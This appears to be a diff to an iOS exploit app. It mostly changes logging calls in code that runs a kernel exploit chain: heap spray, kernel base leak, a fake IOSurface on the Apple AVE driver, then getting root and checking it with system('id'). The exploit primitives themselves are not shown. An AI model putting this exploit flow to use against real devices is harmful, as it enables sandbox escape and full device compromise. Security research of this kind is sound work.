@@ -191,16 +191,14 @@ NSArray* bundle_pocs;
     
     [super viewDidLoad];
     vc = self;
-    
+    print_welcome_message();
     // get the list of poc binaries:
     bundle_pocs = getBundlePocs();
-    
-      
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(void){
         do_exploit();
         dispatch_async(dispatch_get_main_queue(), ^{
             self.kys.enabled = true;
-            NSLog(@"SANDBOX BYPASSED, YAY!!");
+            logMsg("Sandbox should have been bypassed.");
         });
     });
     
@@ -231,35 +229,35 @@ NSArray* bundle_pocs;
     void * kernel_base = NULL;
     void * kernel_spray_address = NULL;
 
-    print_welcome_message();
+
 
     system("id");
 
     ret = offsets_init();
     if (KERN_SUCCESS != ret)
     {
-        ERROR_LOG("Error initializing offsets for current device.");
+        logMsg("Error initializing offsets for current device.");
         goto cleanup;
     }
 
     ret = initialize_iokit_connections();
     if (KERN_SUCCESS != ret)
     {
-        ERROR_LOG("Error initializing IOKit connections!");
+        logMsg("Error initializing IOKit connections!");
         goto cleanup;
     }
 
     ret = heap_spray_init();
     if (KERN_SUCCESS != ret)
     {
-        ERROR_LOG("Error initializing heap spray");
+        logMsg("Error initializing heap spray");
         goto cleanup;
     }
 
     ret = kernel_read_leak_kernel_base(&kernel_base);
     if (KERN_SUCCESS != ret)
     {
-        ERROR_LOG("Error leaking kernel base");
+        logMsg("Error leaking kernel base");
         goto cleanup;
     }
 
@@ -277,28 +275,27 @@ NSArray* bundle_pocs;
     ret = apple_ave_pwn_use_fake_iosurface(kernel_spray_address);
     if (KERN_SUCCESS != kIOReturnError)
     {
-        ERROR_LOG("Error using fake IOSurface... we should be dead by here.");
+        logMsg("Error using fake IOSurface... we should be dead by here.");
     } else {
-        DEBUG_LOG("We're still alive and the fake surface was used");
+        logMsg("We're still alive and the fake surface was used");
     }
-    
+
     ret = test_rw_and_get_root();
     if (KERN_SUCCESS != ret)
     {
-        ERROR_LOG("error getting root");
+        logMsg("error getting root");
         goto cleanup;
     }
-    
+
     system("id");
-    
-    
+
+
 cleanup:
     cleanup_iokit();
     heap_spray_cleanup();
 }
 @end
 void logMsg(char* msg) {
-    NSString* str = [NSString stringWithCString:msg encoding:NSASCIIStringEncoding];
-    [vc logMsg:str];
+    printf("%s\n", msg);
 }
 
